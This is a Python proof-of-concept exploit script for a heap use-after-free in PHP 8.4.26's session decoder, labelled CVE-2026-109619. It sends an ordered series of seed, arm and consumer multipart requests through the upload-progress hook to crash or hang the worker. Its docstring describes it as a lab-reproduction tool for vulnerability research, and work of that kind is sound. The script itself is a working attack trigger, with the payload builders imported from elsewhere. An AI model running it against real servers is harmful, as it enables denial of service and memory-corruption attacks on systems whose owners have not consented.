#!/usr/bin/env python3
# INDEX: app-free session-decode-oom unserialize dangle uaf | cli apache | needs raised memory_limit
"""session_decode_dangle_uaf.py - CVE-2026-109619 app-free session-decoder UAF.

App-free sibling of unserialize_dangle_uaf.py: no app unserialize()/session_start(),
only the upload-progress hook. seed-a/GET/seed-b/GET/arm/consumer - the arm's
pre-RINIT decode OOMs leaving BG(unserialize) dangling, the consumer reuses the
freed struct -> heap-use-after-free (var_unserializer.re:166). Body builders in
primitives/groom/session_decode_dangle.py.

SAPI: CLI deterministic, Apache probabilistic, FPM no (exit 70); 8.4.26 vuln,
8.4.27 clean. The decode OOMs only with ~128M headroom, so run against the
cli-asan-128 lab (docker compose up -d cli-asan-128); the 16M labs do not
reproduce it. Adapted from atombarel (https://github.com/atombarel/php2shell-cli-1mb-lab).

Usage:
    python3 -I poc/bugs/session_decode_dangle_uaf.py http://127.0.0.1:8405
"""
from __future__ import annotations

import argparse
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http, report  # noqa: E402
from common.multipart import multipart_default as multipart  # noqa: E402
from common.session_ids import SID_A, SID_B  # noqa: E402
from primitives.groom.session_decode_dangle import (  # noqa: E402
    arm_body, consumer_body, seed_body)


def run(args):
    base = args.url.rstrip("/")
    post, get = args.post_path, args.get_path

    # seed-a / seed-b: write a large upload-progress record for each sid; the
    # GETs run Basic RINIT and reset BG(unserialize) so each seed starts clean.
    body, headers = multipart(seed_body(SID_A, tag=b"A"))
    s, _ = http(base + post, data=body, headers=headers, timeout=60)
    print(f"[seed-a] POST {post} (big record for A) -> HTTP {s}")
    s, _ = http(base + get, timeout=20)
    print(f"[get-a]  GET  {get} (reset stale globals) -> HTTP {s}")
    body, headers = multipart(seed_body(SID_B, tag=b"B"))
    s, _ = http(base + post, data=body, headers=headers, timeout=60)
    print(f"[seed-b] POST {post} (big record for B) -> HTTP {s}")
    s, _ = http(base + get, timeout=20)
    print(f"[get-b]  GET  {get} (reset stale globals) -> HTTP {s}")

    # arm: pre-RINIT decode of A's record OOMs -> BG(unserialize) left dangling.
    body, headers = multipart(arm_body(SID_A))
    s, _ = http(base + post, data=body, headers=headers, timeout=60)
    print(f"[arm]    POST {post} (OOM in pre-RINIT decode of A) -> HTTP {s} "
          f"(500 = armed, worker survives)")

    # consumer: MUST be the very next request - decodes B through the stale
    # BG(unserialize) REUSE path -> UAF.
    body, headers = multipart(consumer_body(SID_B))
    s, b = http(base + post, data=body, headers=headers, timeout=60)
    report("consumer", s, b, base, short_timeout=8)
    print("[session_decode_dangle_uaf] verdict: consumer died/hung -> vulnerable "
          "(app-free BG(unserialize) UAF in var_unserializer tmp_var); consumer "
          "completed + worker alive -> patched. Run against a 128M cli-asan lab "
          "for the definitive ASan heap-use-after-free report.")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("url")
    ap.add_argument("--post-path", default="/poc.php",
                    help="app-free POST endpoint (no session_start/unserialize)")
    ap.add_argument("--get-path", default="/index.php",
                    help="plain GET endpoint used to reset stale globals")
    run(ap.parse_args())


if __name__ == "__main__":
    main()
